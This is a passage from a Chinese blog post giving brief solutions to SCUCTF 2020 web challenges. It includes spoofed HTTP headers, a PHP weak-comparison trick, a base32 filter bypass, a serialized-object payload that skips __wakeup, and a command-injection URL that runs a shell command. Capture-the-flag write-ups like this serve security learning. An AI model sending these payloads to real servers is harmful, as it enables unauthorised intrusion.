class="hljs-number">1</span>e<span class="hljs-number">9</span>=<span class="hljs-number">1605940928</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">referer</span>: http://scuctf.com<br><span class="hljs-attribute">Via</span>: hgg.com<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure>
<p>得到</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autohotkey">scuctf&#123;i_am_<span class="hljs-built_in">a_powerful</span>_hacker&#125;<br></code></pre></div></td></tr></table></figure>


<hr>
<h3 id="7-看我后面"><a href="#7-看我后面" class="headerlink" title="7.看我后面"></a>7.看我后面</h3><p>后续加index.php.bak得到源码,弱比较,传入5201314得到flag</p>
<hr>
<h3 id="8-normalPHP"><a href="#8-normalPHP" class="headerlink" title="8.normalPHP"></a>8.normalPHP</h3><p>读Php代码<br>经测试,base64被过滤,用base32<br><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/WEB/123.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf">得到<span class="hljs-built_in">flag</span>$<span class="hljs-built_in">flag</span> = <span class="hljs-string">&quot;scuctf&#123;php_is_very_1111asy&#125;&quot;</span><br></code></pre></div></td></tr></table></figure>


<hr>
<h3 id="9-渣男记录"><a href="#9-渣男记录" class="headerlink" title="9.渣男记录"></a>9.渣男记录</h3><p>查找文件备份<a target="_blank" rel="noopener" href="http://www.zip得到源码,select做参数,反序列化/">www.zip得到源码,select做参数,反序列化</a><br>wakeup修改username  手动设置参数大于实际参数就可以绕过wakeup<br>select=O:4:”Love”:3:{s:8:”username”;s:5:”admin”;s:8:”password”;i:520;</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">scuctf</span>&#123;sadsa<span class="hljs-number">541</span>-azhanana-<span class="hljs-number">2</span>xzsdz&#125;<br></code></pre></div></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://121.89.162.165:8987/?select=O:4:%22Love%22:3:%7Bs:8:%22username%22;s:5:%22admin%22;s:8:%22password%22;s:3:%22520%22;%7D">http://121.89.162.165:8987/?select=O:4:%22Love%22:3:{s:8:%22username%22;s:5:%22admin%22;s:8:%22password%22;s:3:%22520%22;}</a></p>
<hr>
<h3 id="10-有手就行"><a href="#10-有手就行" class="headerlink" title="10.有手就行"></a>10.有手就行</h3><p><a target="_blank" rel="noopener" href="http://47.94.226.249:8888/?ctf=sh%20/flag%202%3E&1">http://47.94.226.249:8888/?ctf=sh%20/flag%202%3E%261</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/SCU/">SCU</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/02/07/ciscn_2019_es_2/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ciscn_2019_es_2</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
        typing(title);
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
